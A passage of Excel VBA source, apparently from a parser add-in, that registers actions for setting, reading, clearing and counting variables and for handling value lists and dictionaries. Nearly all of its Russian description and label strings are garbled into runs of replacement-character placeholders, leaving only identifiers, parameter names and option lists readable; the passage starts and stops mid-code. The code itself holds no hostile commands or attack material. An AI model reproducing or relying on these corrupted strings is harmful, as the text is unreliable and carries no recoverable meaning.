                          "zh-cn", "cs", "el", "fi", "hr", "ko", "pl", "ru", "zh-tw", "nl", "pt", "sv")
        .AddParameter "ResultLanguage", aps_Combo, "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", LangArray, "ru"
        .AddParameter "SourceLanguage", aps_Combo, "C |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", LangArray, "en"
    End With



End Sub


Attribute VB_Name = "mod_AAs_Variables"
'---------------------------------------------------------------------------------------
' Module        : mod_AAs_Variables                    Version:
' Author        : Igor Vakhnenko                   Date: 21.10.2018
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit: Option Compare Text: Option Private Module

Sub InitializeActions_Variables(ByRef AAs As ArrayActions)
    On Error Resume Next
    With AAs.AddAction(fc_Variable, "SetVariable", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|," & vbNewLine & _
            "|fffd||fffd||fffd| |fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)"
        .AddParameter "Name", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "RefersTo", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)", Array("row", "parser"), "parser"
    End With
    
    With AAs.AddAction(fc_Variable, "GetVariable", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| {1}, {2}, {8}, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
            "(|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
        .AddParameter "Name", aps_RuntimeList, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "Variables"
        .AddParameter "RefersTo", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)", Array("row", "parser"), "parser"
        .AddParameter "Default", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd|  |fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
    End With
    
    With AAs.AddAction(fc_Variable, "ClearVariable", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)"
        .AddParameter "Name", aps_RuntimeList, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "Variables"
        .AddParameter "RefersTo", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)", Array("row", "parser"), "parser"
    End With
    
    With AAs.AddAction(fc_Variable, "IncreaseCounter", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| %counterN%, |fffd||fffd||fffd| N  |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| 500 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Index", aps_Combo, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("1", "2", "3", "4", "5"), "1"
        .AddParameter "ReturnValue", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd|", "|fffd||fffd||fffd|"), "|fffd||fffd||fffd|"
    End With
    With AAs.AddAction(fc_Variable, "ShowVariablesDialog", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd|.|fffd|.)" & vbNewLine & _
            "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "VariableNameList", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| ;"
    End With
    
    With AAs.AddAction(fc_Variable, "CreateValuesList", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)"
    End With
    
    With AAs.AddAction(fc_Variable, "AddItemIntoValuesList", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|. |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
            "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|foo|fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|bar|fffd|, |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd|foo|bar|fffd|." & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
        .AddParameter "AddToVariable", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Separator", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", Array("|", "", ARSEP), "|"
    End With
    
    With AAs.AddAction(fc_Variable, "GetValuesList", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|. |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
    End With
    
    With AAs.AddAction(fc_Variable, "Dictionary_AddItem", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| '|fffd||fffd||fffd||fffd|', |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|) |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd| Dictionary)." & vbNewLine & _
            "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd|||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)." & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| '|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
        .AddParameter "Key", aps_Text, "|fffd||fffd||fffd||fffd|"
        .AddParameter "Value", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "DicName", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    End With
    
    With AAs.AddAction(fc_Variable, "Dictionary_FindKey", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd| Dictionary)." & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)." & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| '|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
        .AddParameter "Key", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|"
        .AddParameter "ActionIfFound", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", _
            Array("", "return 1", "return key", "return value", "return empty", "remove key", "stop -1", "stop -2"), ""
        .AddParameter "ActionIfAbsent", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", _
            Array("", "return 0", "add key", "stop -1", "stop -2"), ""
        .AddParameter "DicName", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    End With
    
    With AAs.AddAction(fc_Variable, "Dictionary_GetContent", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd| Dictionary)." & vbNewLine & _
            "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| '|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| '|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|' |fffd||fffd||fffd||fffd||fffd||fffd| 'Count' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| 'RemoveAll' |fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| '|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
        .AddParameter "ResultType", aps_List, "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("keys", "values", "key|value", "Count", "RemoveAll"), "keys"
